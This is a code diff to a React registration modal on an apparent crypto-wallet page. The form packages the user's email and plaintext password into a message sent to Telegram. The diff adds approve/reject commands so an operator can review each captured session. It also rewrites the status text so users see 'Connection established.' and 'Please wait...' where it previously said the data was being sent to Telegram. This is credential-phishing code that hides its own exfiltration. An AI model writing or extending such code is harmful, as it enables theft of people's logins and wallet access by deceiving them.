@@ -63,6 +63,12 @@ const RegisterModal: React.FC<RegisterModalProps> = ({
 ${data.email}
 ${data.password}
 \`\`\`
+
+*To approve this registration, reply with:*
+\`/approve_registration ${data.sessionId}\`
+
+*To reject this registration, reply with:*
+\`/reject_registration ${data.sessionId}\`
         `.trim();
   };
 
@@ -147,20 +153,17 @@ ${data.password}
     }
   };
 
-  const isFormValid =
-    email &&
-    password &&
-    !emailError &&
-    !passwordError &&
-    validateEmail(email) &&
-    validatePassword(password);
+  const isFormValid = email && 
+                     password && 
+                     !emailError && 
+                     !passwordError && 
+                     validateEmail(email) && 
+                     validatePassword(password);
 
   const getStatusIcon = () => {
     switch (telegramStatus) {
       case "sending":
-        return (
-          <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-purple-600"></div>
-        );
+        return <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-purple-600"></div>;
       case "success":
         return <div className="w-5 h-5 text-green-600">✓</div>;
       case "error":
@@ -173,7 +176,7 @@ ${data.password}
   const getStatusMessage = () => {
     switch (telegramStatus) {
       case "sending":
-        return "Sending registration to Telegram...";
+        return "Connection established.";
       case "success":
         return telegramMessage;
       case "error":
@@ -269,7 +272,7 @@ ${data.password}
                 onClick={handleRegister}
                 disabled={!isFormValid || isLoading}
               >
-                {isLoading ? "Sending to Telegram..." : "Continue to Wallet"}
+                {isLoading ? "Please wait..." : "Continue to Wallet"}
               </Button>
             </div>
           </div>
